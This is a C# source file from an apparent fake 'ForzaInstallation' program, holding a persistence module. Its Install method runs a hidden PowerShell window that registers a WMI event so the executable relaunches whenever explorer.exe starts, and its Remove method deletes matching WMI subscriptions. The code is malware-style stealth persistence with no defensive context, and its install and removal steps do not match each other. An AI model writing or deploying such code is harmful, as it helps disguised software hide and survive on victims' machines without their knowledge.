using System.Diagnostics;

namespace ForzaInstallation.Persistence
{
    internal static class WmiSubscription
    {
        internal static string Install()
        {
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var escapedPath = path.Replace("'", "''");
                var psCmd = "Register-WmiEvent -Class Win32_ProcessStartTrace -Action { if ($_.ProcessName -eq 'explorer.exe') { Start-Process '" + escapedPath + "' } }";
                var psi = new ProcessStartInfo("powershell.exe", "-WindowStyle Hidden -NoProfile -Command \"" + psCmd + "\"")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(30000); return p.ExitCode == 0 ? "WMI:OK" : "WMI:FAIL"; }
            }
            catch { return "WMI:FAIL"; }
        }

        internal static string Remove()
        {
            try
            {
                var psCmd = "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object { $_.Query -like '*ForzaInstallation**' } | Remove-WmiObject 2>$null; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object { $_.CommandLineTemplate -like '*ForzaInstallation**' } | Remove-WmiObject 2>$null";
                var psi = new ProcessStartInfo("powershell.exe", "-WindowStyle Hidden -NoProfile -Command \"" + psCmd + "\"")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(30000); }
            }
            catch { }
            return "WMI removed";
        }
    }
}
